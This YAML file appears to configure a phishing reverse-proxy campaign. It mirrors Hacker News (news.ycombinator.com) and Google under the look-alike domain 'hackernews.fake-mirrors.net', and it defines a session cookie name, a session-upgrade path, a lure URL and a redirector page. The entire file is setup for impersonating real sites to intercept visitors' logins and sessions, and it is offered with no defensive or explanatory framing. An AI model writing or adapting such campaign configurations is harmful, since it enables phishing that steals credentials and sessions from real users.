campaign:
  mirrorDomain: 'hackernews.fake-mirrors.net'
  description: |
    Mirror for "hackernews.com" site.

  upgradeSessionPath: '/asiph.cgi'
  sessionCookieName: 'uhtho'

proxies:
  - proxyId: 'default'
    url: 'http://localhost:8080'
    isEnabled: true

targets:
  - targetId: 'apex'
    accessLevel: 'landing'
    donorSecure: true
    donorSub: 'news'
    donorDomain: 'ycombinator.com'
    donorPort: 443
    mirrorSecure: true
    mirrorSub: '@'
    mirrorPort: 443
    label: 'hackernews'
    mainPage: 'hackernews/main-page.html'
    notFoundPage: 'not-found-page.html'
    faviconIco: 'favicon.ico'
    robotsTxt: 'robots.txt'
    isEnabled: true

  - targetId: 'google-www'
    accessLevel: 'landing'
    donorSecure: true
    donorSub: 'www'
    donorDomain: 'google.com'
    donorPort: 443
    mirrorSecure: true
    mirrorSub: 'itc'
    mirrorPort: 443
    label: 'google'
    isEnabled: true

redirectors:
  - redirectorId: 'simple'
    page: 'hackernews/simple.html'

lures:
  - lureId: 'test'
    path: '/2b7d1e2d7aec-test.cgi'
    redirectorId: 'simple'
    isEnabled: true
